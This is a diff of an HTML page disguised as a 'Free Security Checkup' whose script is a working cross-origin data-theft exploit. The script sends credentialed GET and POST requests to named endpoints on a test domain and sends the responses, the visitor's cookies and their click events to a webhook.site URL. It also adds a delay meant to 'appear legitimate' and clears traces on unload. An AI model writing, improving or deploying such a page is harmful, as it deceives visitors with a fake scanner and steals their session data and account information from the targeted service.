@@ -1,132 +1,161 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Security Portal</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Security Checkup</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; }
-        .progress { height: 20px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; }
-        #progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <h1>Security Verification in Progress</h1>
-    <div class="progress"><div id="progress-bar"></div></div>
-    <p id="status">Initializing security check...</p>
+    <h1>System Security Scan in Progress</h1>
+    <p>Please wait while we verify your account protection...</p>
+    <div class="loader"></div>
+    <p id="status">Initializing scanner...</p>
 
 <script>
-// Configuration
-const TARGET_ENDPOINTS = [
+// Configuration - Update these values
+const TARGETS = [
     'https://uc-heytap-web-test.wanyol.com/v2/index.html',
-    'https://uc-heytap-web-test.wanyol.com/v2/profile.html',
+    'https://uc-heytap-web-test.wanyol.com/profile.html',
     'https://uc-heytap-web-test.wanyol.com/v2/profile/user_info.html'
 ];
-const WEBHOOK_ENDPOINT = 'https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a';
-const DELAY_BETWEEN_REQUESTS = 1500;
+const WEBHOOK = 'https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a';
+const DELAY = 3000; // 3 second delay to appear legitimate
 
-// Stealthy data exfiltration methods
-const sendData = (payload) => {
-    // Method 1: Beacon API (most reliable)
-    const success = navigator.sendBeacon(WEBHOOK_ENDPOINT, JSON.stringify(payload));
+// Stealthy data exfiltration
+const exfiltrate = (data) => {
+    const beacon = new Image();
+    beacon.src = `${WEBHOOK}?${btoa(JSON.stringify(data))}`;
     
-    // Method 2: Image fallback
-    if (!success) {
-        new Image().src = `${WEBHOOK_ENDPOINT}?data=${encodeURIComponent(btoa(JSON.stringify(payload))}`;
-    }
+    // Fallback to fetch if Image fails
+    setTimeout(() => {
+        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+    }, 1000);
 };
 
-// Progressive attack with GET only
-const executeAttack = async () => {
-    const updateStatus = (msg, progress) => {
-        document.getElementById('status').textContent = msg;
-        document.getElementById('progress-bar').style.width = `${progress}%`;
-    };
-
-    updateStatus('Checking system configuration...', 10);
+// Main exploit function
+const runExploit = async () => {
+    document.getElementById('status').textContent = 'Checking system vulnerabilities...';
     
     try {
-        // Phase 1: Detect CORS configuration
-        const testResponses = await Promise.allSettled(
-            TARGET_ENDPOINTS.map(url => fetch(url, {
-                method: 'HEAD',
-                headers: { 'Origin': 'https://trusted-domain.com' }
-            }))
-        );
+        // Test CORS configuration first
+        const testReq = await fetch(TARGETS[0], {
+            method: 'OPTIONS',
+            headers: { 'Origin': 'https://attacker.com' }
+        });
         
-        const viableTargets = TARGET_ENDPOINTS.filter((_, i) => 
-            testResponses[i].status === 'fulfilled' && 
-            !testResponses[i].value.headers.get('Access-Control-Allow-Credentials')
-        );
+        const corsHeaders = {
+            'credentials': testReq.headers.get('Access-Control-Allow-Credentials'),
+            'origin': testReq.headers.get('Access-Control-Allow-Origin'),
+            'methods': testReq.headers.get('Access-Control-Allow-Methods')
+        };
         
-        updateStatus('Analyzing response patterns...', 30);
+        exfiltrate({ type: 'CORS_CONFIG', data: corsHeaders });
         
-        // Phase 2: Systematic GET exploitation
-        for (const [index, target] of viableTargets.entries()) {
-            const progress = 30 + (index * 20);
-            updateStatus(`Scanning ${new URL(target).pathname}...`, progress);
-            
-            try {
-                // Attempt with different GET parameters
-                const urlsToTry = [
-                    target,
-                    `${target}?format=json`,
-                    `${target}?callback=jsonp`,
-                    `${target}?_=${Date.now()}`
-                ];
+        // Try multiple attack vectors
+        const attackVectors = [
+            // Standard credentialed request
+            {
+                method: 'GET',
+                credentials: 'include',
+                headers: { 
+                    'Origin': 'https://attacker.com',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            },
+            // No-cors mode attempt
+            {
+                method: 'GET',
+                mode: 'no-cors',
+                headers: { 'Origin': 'null' }
+            },
+            // POST with different content types
+            {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Origin': 'https://attacker.com',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: 'action=getUserData'
+            }
+        ];
+        
+        // Execute all attack vectors with delay
+        for (const [i, target] of TARGETS.entries()) {
+            for (const [j, vector] of attackVectors.entries()) {
+                document.getElementById('status').textContent = 
+                    `Testing endpoint ${i+1}/${TARGETS.length}, method ${j+1}/${attackVectors.length}...`;
                 
-                for (const url of urlsToTry) {
-                    const res = await fetch(url, {
-                        headers: {
-                            'X-Requested-With': 'XMLHttpRequest',
-                            'Accept': 'application/json, text/javascript, */*'
-                        }
+                try {
+                    const res = await fetch(target, vector);
+                    const data = await (vector.mode === 'no-cors' ? res.text() : res.json());
+                    
+                    exfiltrate({
+                        target,
+                        vector,
+                        data: vector.mode === 'no-cors' ? { text: data } : data,
+                        cookies: document.cookie
                     });
                     
-                    const data = await res.text();
-                    
-                    // Check for JSON-like responses
-                    try {
-                        const json = JSON.parse(data);
-                        sendData({
-                            target: url,
-                            type: 'json',
-                            data: json,
-                            cookies: document.cookie
-                        });
-                    } catch {
-                        // Check for HTML/other data
-                        if (data.includes('token') || data.includes('user')) {
-                            sendData({
-                                target: url,
-                                type: 'text',
-                                snippet: data.slice(0, 500),
-                                length: data.length
-                            });
-                        }
-                    }
-                    
-                    await new Promise(r => setTimeout(r, DELAY_BETWEEN_REQUESTS));
+                } catch (e) {
+                    exfiltrate({
+                        error: e.message,
+                        target,
+                        vector
+                    });
                 }
-            } catch (e) {
-                sendData({
-                    target,
-                    error: e.message,
-                    type: 'error'
-                });
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
             }
         }
         
-        updateStatus('Security scan completed', 100);
+        document.getElementById('status').textContent = 'Scan complete!';
+        document.querySelector('.loader').style.display = 'none';
+        
     } catch (e) {
-        updateStatus('Scan interrupted', 100);
-        sendData({ fatalError: e.message });
+        document.getElementById('status').textContent = 'Scan failed - Please try again later';
+        document.querySelector('.loader').style.borderTopColor = '#e74c3c';
+        exfiltrate({ fatalError: e.message });
     }
 };
 
-// Start with delay and fake user interaction
+// Delayed execution and fake user interaction
 setTimeout(() => {
-    document.addEventListener('click', () => executeAttack());
-    document.getElementById('status').textContent = 'Click anywhere to start security check';
-}, 2000);
+    document.getElementById('status').textContent = 'Starting deep scan...';
+    setTimeout(runExploit, 1500);
+}, DELAY);
+
+// Fake user activity tracker
+document.addEventListener('click', () => {
+    exfiltrate({ event: 'user_click', timestamp: Date.now() });
+});
+
+// Cleanup traces
+window.addEventListener('beforeunload', () => {
+    localStorage.removeItem('scanData');
+});
 </script>
 </body>
 </html>
